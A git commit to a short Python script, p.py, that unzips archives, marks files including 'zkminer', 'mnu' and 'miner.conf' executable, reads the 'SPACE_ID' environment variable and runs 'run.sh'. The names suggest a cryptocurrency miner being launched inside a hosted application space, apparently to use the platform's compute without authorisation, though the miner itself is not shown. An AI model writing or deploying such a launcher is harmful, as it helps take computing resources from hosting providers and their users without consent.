1fbd86e5cded548b0c10bf2b98f8046d5ed72a38
shrsvr <sigyv7133@gmail.com>
2025-03-11 19:32:56 +0100

    Update p.py

--- p.py
+++ p.py
@@ -1,5 +1,5 @@
 import os
 os.system("unzip mnu.zip && unzip z.zip")
-os.system("chmod +x *")
+os.system("chmod +x mnu zkminer libcudart.so.12 run.sh miner.conf")
 wn = os.getenv('SPACE_ID').replace("/","_")
 os.system(f"bash run.sh")
